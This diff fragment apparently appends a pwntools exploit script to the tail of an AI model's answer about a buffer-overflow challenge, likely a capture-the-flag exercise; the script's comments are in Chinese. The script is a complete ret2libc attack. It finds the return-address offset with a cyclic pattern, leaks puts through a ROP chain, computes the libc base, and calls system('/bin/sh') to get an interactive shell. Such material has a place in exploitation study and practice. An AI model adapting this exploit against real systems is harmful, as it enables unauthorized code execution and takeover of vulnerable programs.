@@ -154,3 +154,91 @@ AIMessage(content='To solve this challenge using pwntools, we can exploit the bu
  '\n'
  'By following these steps and using this script, you should be able to use '
  'pwntools to exploit the buffer overflow and gain a shell.')
+
+from pwn import *
+
+# 设置pwntools以适应正确的架构
+context.binary = elf = ELF('./vulnerable_binary')  # 替换为你的二进制文件名
+context.log_level = 'debug'  # 可选：设置为'info'或'debug'以查看更多输出
+
+def main():
+    # 启动二进制程序
+    p = process(elf.path)
+
+    # 步骤1: 找到返回地址的偏移量
+    payload = cyclic(200)  # 生成200字节的循环模式
+
+    p.recvuntil("Hello. What's your name?\n")
+    p.sendline(payload)
+    p.recvuntil("Is your name `")
+    p.recvline()
+    p.recvuntil("correct (yes/no)?\n")
+    p.sendline('no')
+
+    # 等待进程崩溃并获取核心转储
+    p.wait()
+    core = p.corefile
+
+    # 找到RIP/RSP被覆盖的位置
+    rip_offset = cyclic_find(core.read(core.rsp, 4))
+    log.info(f'Offset to RIP: {rip_offset}')
+
+    # 步骤2: 泄露一个libc地址
+    # 重启进程
+    p = process(elf.path)
+
+    # 创建ROP对象
+    rop = ROP(elf)
+
+    # 我们将使用的函数/部分的地址
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+    main_addr = elf.symbols['main']
+
+    # 构建ROP链以泄露puts地址并返回到main
+    rop.call(puts_plt, [puts_got])
+    rop.call(main_addr)
+
+    padding = b'A' * rip_offset
+    payload = padding + rop.chain()
+
+    p.recvuntil("Hello. What's your name?\n")
+    p.sendline(payload)
+    p.recvuntil("Is your name `")
+    # 接收泄露的地址
+    leaked_puts = p.recvline().strip()[:8].ljust(8, b'\x00')
+    leaked_puts = u64(leaked_puts)
+    log.info(f'Leaked puts address: {hex(leaked_puts)}')
+
+    p.recvuntil("correct (yes/no)?\n")
+    p.sendline('no')  # 返回到main
+
+    # 步骤3: 计算libc基址
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 根据你的系统更新路径
+    libc_base = leaked_puts - libc.symbols['puts']
+    log.info(f'Libc base address: {hex(libc_base)}')
+
+    # 步骤4: 构造最终的有效载荷以获得shell
+    system_addr = libc_base + libc.symbols['system']
+    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+    exit_addr = libc_base + libc.symbols['exit']
+
+    # 构建ROP链
+    rop = ROP(libc)
+    rop.call(system_addr, [bin_sh_addr])
+
+    payload = padding + rop.chain()
+
+    # 步骤5: 发送最终有效载荷
+    p.recvuntil("Hello. What's your name?\n")
+    p.sendline(payload)
+    p.recvuntil("Is your name `")
+    p.recvline()
+    p.recvuntil("correct (yes/no)?\n")
+    p.sendline('yes')  # 程序将在之后退出
+
+    # 切换到交互模式以使用shell
+    p.interactive()
+
+if __name__ == '__main__':
+    main()
